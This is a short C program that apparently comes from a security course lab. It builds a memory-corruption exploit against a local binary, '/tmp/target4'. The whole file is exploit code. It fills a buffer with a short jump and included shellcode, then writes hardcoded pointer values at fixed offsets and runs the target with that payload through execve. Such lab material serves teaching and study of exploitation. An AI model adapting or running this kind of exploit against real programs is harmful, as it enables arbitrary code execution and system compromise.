#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char exploit[1024];
  memset(exploit, 0xff, 1024);
  exploit[0] = 0xeb;
  exploit[1] = 0x06;
  memcpy(exploit + 8, shellcode, sizeof(shellcode) - 1);
  int *psl = (int *)(exploit + 504);
  *psl = 0x0804a068;
  int *psr = (int *)(exploit + 508);
  *psr = 0xbffffa44;

  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
